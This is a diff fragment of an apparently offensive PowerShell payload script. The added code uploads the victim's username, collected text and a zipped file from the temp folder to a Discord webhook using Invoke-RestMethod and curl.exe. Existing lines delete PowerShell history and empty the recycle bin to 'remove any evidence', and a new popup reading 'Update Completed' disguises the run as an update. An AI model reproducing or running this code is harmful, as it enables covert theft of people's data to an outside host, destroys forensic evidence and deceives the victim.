+$hookurl = "$DiscordAccessToken"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($DiscordAccessToken))){Upload-Discord -file "$env:tmp/$ZIP"}
+
+ 
 
 ############################################################################################################################################################
 
 <#
-
 .NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
@@ -403,5 +581,8 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 		
+############################################################################################################################################################
 
-	
+# Popup message to signal the payload is done
+
+$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
